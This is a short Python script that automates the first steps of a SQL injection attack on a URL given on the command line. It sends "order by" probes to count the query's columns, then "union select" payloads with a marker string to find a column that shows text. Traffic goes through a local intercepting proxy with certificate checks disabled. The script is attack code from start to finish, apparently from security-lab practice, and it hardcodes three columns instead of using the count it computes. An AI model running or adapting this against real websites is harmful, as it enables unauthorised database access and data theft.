import sys, urllib3, requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def num_column(url):
    for i in range(1, 5):
        r = requests.get(url+f"' order by {i}--", verify=False, proxies=proxies)
        if r.status_code == 500:
            return i -1


def mysqli(url):
    num = num_column(url) 
    print(f'[+] The number column is: {num}')
    payload = ('null,'*3)[:-1].split(',')
    for i in range(0, 3):
        payload[i] = "\'QVFju1\'"
        r = requests.get(url+"' union select " + ",".join(i for i in payload) + '--', verify=False, proxies=proxies)
        payload[i] = 'null'
        if r.status_code == 200:
            return f'[+] The string  value stored in: {i+1}'

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except:
        print("[*] Usage: %s <url>" % sys.argv[0])
        print("[*] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    print(mysqli(url))
